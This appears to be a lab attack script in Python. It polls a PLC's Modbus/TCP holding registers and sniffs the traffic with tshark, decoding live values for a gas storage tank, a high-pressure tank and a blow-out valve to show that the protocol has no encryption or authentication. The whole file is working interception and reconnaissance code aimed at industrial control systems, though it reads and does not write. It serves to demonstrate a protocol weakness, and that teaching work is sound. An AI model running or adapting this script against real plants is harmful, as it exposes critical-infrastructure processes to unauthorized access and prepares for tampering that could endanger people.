#!/usr/bin/env python3
"""
Sniff live Modbus/TCP between this attack machine and the PLC and decode it.
Modbus has no encryption and no authentication, so every register read and
write travels the wire in clear text. We read the controller's process
registers and capture the exchange with tshark to prove the point - the live
gas-pressure values appear on the wire with no key and no login.
Usage: modbus_sniff.py [PLC_IP] [IFACE]
"""
import subprocess, sys, threading, time

PLC = sys.argv[1] if len(sys.argv) > 1 else "172.18.0.3"
IFACE = sys.argv[2] if len(sys.argv) > 2 else "eth0"
NAME = {1124: "GST   gas storage tank",
        1126: "HPT   high-pressure tank",
        1132: "sysSen system operational",
        1134: "boSen  blow-out valve open"}

stop = False
def poll():
    from pymodbus.client import ModbusTcpClient
    c = ModbusTcpClient(PLC, port=502); c.connect()
    while not stop:
        c.read_holding_registers(1124, count=11)
        time.sleep(0.2)
    c.close()

print(f"[*] sniffing Modbus/TCP on {IFACE}   PLC = {PLC}:502")
print("[*] Modbus has NO encryption and NO authentication - every frame is clear text")
print(f"\n    $ tshark -i {IFACE} -f 'tcp port 502' -O modbus\n")
t = threading.Thread(target=poll, daemon=True); t.start()
time.sleep(0.5)

cmd = ["tshark", "-i", IFACE, "-f", "tcp port 502", "-c", "20", "-l", "-T", "fields",
       "-e", "ip.src", "-e", "ip.dst", "-e", "modbus.func_code",
       "-e", "modbus.regnum16", "-e", "modbus.regval_uint16"]
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
shown = 0
for line in p.stdout:
    parts = (line.rstrip("\n").split("\t") + [""] * 5)[:5]
    src, dst, fc, regs, vals = parts
    fc = fc.split(",")[0]
    if fc == "3" and not regs:
        print(f"    {src:>12}  ->  {dst:<12}   READ HOLDING REGISTERS  (query)")
        shown += 1
    elif fc == "3" and regs:
        rlist = regs.split(","); vlist = vals.split(",")
        m = dict(zip(rlist, vlist))
        print(f"    {src:>12}  ->  {dst:<12}   RESPONSE - live process values in clear text:")
        for reg, label in NAME.items():
            v = m.get(str(reg), "?")
            print(f"                     reg {reg}  {label:<26} = {v}")
        shown += 1
    if shown >= 6:
        break
stop = True
try:
    p.terminate()
except Exception:
    pass
time.sleep(0.3)
print("\n[+] no keys, no login, no TLS - the whole plant is readable to anyone on the wire")
